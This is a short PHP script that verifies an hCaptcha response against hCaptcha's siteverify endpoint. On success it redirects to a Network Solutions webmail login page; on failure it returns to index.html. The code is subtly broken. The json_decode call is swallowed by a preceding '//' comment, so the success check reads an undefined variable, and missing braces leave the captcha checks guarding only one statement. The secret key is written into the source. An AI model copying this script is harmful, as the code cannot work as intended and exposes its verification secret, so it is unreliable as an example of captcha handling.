<?php

if(isset($_POST['submit']))
    if(isset($_POST['h-captcha-response']) && !empty($_POST['h-captcha-response']))
    $data = array(
            'secret' => "0xe1c668780cf6ec82093E223032dB60eA44460f0b",
            'response' => $_POST['h-captcha-response']
        );
		$verify = curl_init();
curl_setopt($verify, CURLOPT_URL, "https://hcaptcha.com/siteverify");
curl_setopt($verify, CURLOPT_POST, true);
curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($verify, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($verify);// var_dump($response);$responseData = json_decode($response);
if($responseData->success) {
    // your success code goes here
	  print "<meta http-equiv=\"refresh\" content=\"0;URL=https://webmail.networksolutionsemail.com/ox6/interfaces/sso/login.php\">";
} 
else {
   // return error to user; they did not pass
   print "<meta http-equiv=\"refresh\" content=\"0;URL=index.html\">";
}
?>